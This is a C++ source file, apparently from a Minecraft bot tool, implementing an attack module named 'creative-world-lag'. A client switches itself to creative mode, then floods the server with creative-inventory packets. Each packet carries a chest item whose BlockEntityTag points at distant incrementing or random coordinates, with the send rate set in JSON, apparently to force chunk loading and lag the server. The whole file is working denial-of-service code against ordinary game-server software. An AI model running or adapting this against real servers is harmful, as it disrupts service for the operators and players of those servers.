#include "AttackCreativeWorldLag.h"

#include <mclib/util/Utility.h>
#include <iostream>
#include <algorithm>

namespace avalanche {

s32 AttackCreativeWorldLag::s_SendPerTick = 1;

AttackCreativeWorldLag::AttackCreativeWorldLag(mc::core::Client* client)
    : m_Client(client),  
      m_PositionProvider(std::make_unique<IncrementalPositionProvider>(mc::Vector3i(0, 64, 0), 10, 10)),
      m_SendGamemode(true)
{
    client->RegisterListener(this);
}

AttackCreativeWorldLag::~AttackCreativeWorldLag() {
    m_Client->UnregisterListener(this);
}

mc::inventory::Slot AttackCreativeWorldLag::CreateSlotAttack() {
    mc::nbt::NBT nbt;
    auto tag = &nbt.GetRoot();

    tag->SetName(L"tag");

    auto compound = std::make_shared<mc::nbt::TagCompound>(L"BlockEntityTag");

    auto position = m_PositionProvider->NextPosition();

    compound->AddItem(mc::nbt::TagType::Int, std::make_shared<mc::nbt::TagInt>("x", (s32)position.x));
    compound->AddItem(mc::nbt::TagType::Int, std::make_shared<mc::nbt::TagInt>("y", (s32)position.y));
    compound->AddItem(mc::nbt::TagType::Int, std::make_shared<mc::nbt::TagInt>("z", (s32)position.z));

    tag->AddItem(mc::nbt::TagType::Compound, compound);

    return mc::inventory::Slot(54, 1, 0, nbt);
}

void AttackCreativeWorldLag::OnTick() {
    // Only start doing the attack once the world data is received.
    if (!m_Client->GetWorld()->GetChunk(mc::ToVector3i(m_Client->GetPlayerController()->GetPosition())))
        return;

    using namespace mc::protocol::packets::out;

    if (m_SendGamemode) {
        m_SendGamemode = false;

        ChatPacket packet("/gamemode 1");
        m_Client->GetConnection()->SendPacket(&packet);
    }

    for (s32 i = 0; i < s_SendPerTick; ++i) {
        auto attackSlot = CreateSlotAttack();
        CreativeInventoryActionPacket packet(36, attackSlot);

        m_Client->GetConnection()->SendPacket(&packet);
    }
}

bool AttackCreativeWorldLag::ReadJSON(const Json::Value& attackNode) {
    auto&& methodNode = attackNode["method"];
    if (!methodNode.isString() || methodNode.asString() != "creative-world-lag")
        return false;

    auto&& sendPerTickNode = attackNode["send-per-tick"];
    if (!sendPerTickNode.isNull())
        s_SendPerTick = sendPerTickNode.asInt();

    auto&& sendGamemodeNode = attackNode["send-gamemode"];
    if (sendGamemodeNode.isBool())
        m_SendGamemode = sendGamemodeNode.asBool();

    auto&& positionNode = attackNode["position"];
    if (positionNode.isObject()) {
        auto&& positionMethodNode = positionNode["method"];

        std::string positionMethod = "increment";
        if (positionMethodNode.isString())
            positionMethod = positionMethodNode.asString();
        
        std::transform(positionMethod.begin(), positionMethod.end(), positionMethod.begin(), ::tolower);

        if (positionMethod == "increment") {
            auto&& initialNode = positionNode["initial"];
            mc::Vector3i initial(0, 64, 0);

            if (initialNode.isObject()) {
                auto&& xNode = initialNode["x"];
                auto&& yNode = initialNode["y"];
                auto&& zNode = initialNode["z"];

                if (xNode.isInt())
                    initial.x = xNode.asInt();

                if (yNode.isInt())
                    initial.y = yNode.asInt();

                if (zNode.isInt())
                    initial.z = zNode.asInt();
            }

            s32 xInc = 10;
            s32 zInc = 10;

            auto&& incrementNode = positionNode["increment"];
            if (incrementNode.isObject()) {
                auto&& xNode = incrementNode["x"];
                auto&& zNode = incrementNode["z"];

                if (xNode.isInt())
                    xInc = xNode.asInt();

                if (zNode.isInt())
                    zInc = zNode.asInt();
            }

            m_PositionProvider = std::make_unique<IncrementalPositionProvider>(initial, xInc, zInc);
        } else if (positionMethod == "random") {
            m_PositionProvider = std::make_unique<RandomPositionProvider>();
        }
    }

    return true;
}

} // ns avalanche
